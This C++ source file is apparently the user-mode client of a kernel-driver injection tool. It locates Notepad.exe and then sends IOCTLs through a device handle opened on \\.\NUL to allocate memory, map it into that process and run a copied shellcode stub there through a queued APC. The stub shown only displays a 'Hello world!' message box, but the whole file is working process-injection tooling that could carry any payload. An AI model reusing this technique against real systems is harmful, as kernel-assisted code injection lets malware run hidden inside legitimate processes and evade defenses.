#include <Windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <TlHelp32.h>
#include <fomo_common.h>

static bool g_bRunning = true;

void dummyThread() {
    while (g_bRunning)
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
}

// MessageBoxA signature
typedef int(__stdcall* MessageBoxA_t)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);

typedef struct _BOX_ARGS {
    MessageBoxA_t MessageBoxA;
    char test[0x1000];
} BOX_ARGS, *PBOX_ARGS;

void __declspec(code_seg(".inj_sec$1")) __stdcall Shellcode(PBOX_ARGS args) {
    args->MessageBoxA(nullptr, args->test, args->test, MB_OK);
}

PVOID __declspec(code_seg(".inj_sec$2")) __stdcall Shellcode_End() {
	return 0;
}

int main(int argc, char** argv) {
    // create a dummy thread that the driver can use to queue APCs
    std::thread t1(dummyThread);
    std::this_thread::sleep_for(std::chrono::milliseconds(500));

    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to create snapshot: " << GetLastError() << std::endl;
        return 1;
    }

    PROCESSENTRY32W entry = {0};
    entry.dwSize = sizeof(entry);
    if (!Process32FirstW(hSnapshot, &entry)) {
        std::cout << "Failed to get first process: " << GetLastError() << std::endl;
        return 1;
    }

    do {
        if (wcscmp(entry.szExeFile, L"Notepad.exe") == 0) {
            pid = entry.th32ProcessID;
            break;
        }
    } while (Process32NextW(hSnapshot, &entry));

    CloseHandle(hSnapshot);

    if (pid == 0) {
        std::cout << "Failed to find process" << std::endl;
        return 1;
    }

    std::cout << "Found process with pid: " << pid << std::endl;

    // open device
    HANDLE hDevice = CreateFileW(L"\\\\.\\NUL", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to open device: " << GetLastError() << std::endl;
        return 1;
    }

    // get shellcode size
    ULONG shellcode_size = (ULONG)((SIZE_T)Shellcode_End - (SIZE_T)Shellcode);
    ULONG alloc_size = shellcode_size + sizeof(BOX_ARGS);

    IO_ALLOC_REQUEST_DATA alloc_request = {0};
    alloc_request.Size = alloc_size;

    IO_ALLOC_RESPONSE_DATA alloc_response = {0};
    DeviceIoControl(hDevice, IO_ALLOC_REQUEST, &alloc_request, sizeof(alloc_request), &alloc_response, sizeof(alloc_response), nullptr, nullptr);

    std::cout << "Last error: " << GetLastError() << std::endl;
    std::cout << "Allocated buffer at: " << std::hex << alloc_response.Address << std::endl;

    BOX_ARGS args = {0};
    args.MessageBoxA = MessageBoxA;
    strcpy_s(args.test, "Hello world!");

    memcpy(alloc_response.Address, &args, sizeof(args));

    PVOID shellcodeAddress = (PVOID)((PUCHAR)alloc_response.Address + sizeof(args));
    memcpy(shellcodeAddress, Shellcode, shellcode_size);

    IO_MAP_MEMORY_REQUEST_DATA map_data = {0};
    map_data.Pid = pid;
    map_data.Address = alloc_response.Address;
    map_data.Size = alloc_request.Size;

    DeviceIoControl(hDevice, IO_MAP_MEMORY_REQUEST, &map_data, sizeof(map_data), nullptr, 0, nullptr, nullptr);
    std::cout << "Last error: " << GetLastError() << std::endl;

    IO_EXECUTE_REQUEST_DATA execute_request = {0};
    execute_request.Pid = pid;
    execute_request.Address = shellcodeAddress;
    execute_request.Argument = alloc_response.Address;

    DeviceIoControl(hDevice, IO_EXECUTE_REQUEST, &execute_request, sizeof(execute_request), nullptr, 0, nullptr, nullptr);
    std::cout << "Last error: " << GetLastError() << std::endl;

    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    std::cout << "done" << std::endl;

    g_bRunning = false;
    t1.join();
    return 0;
}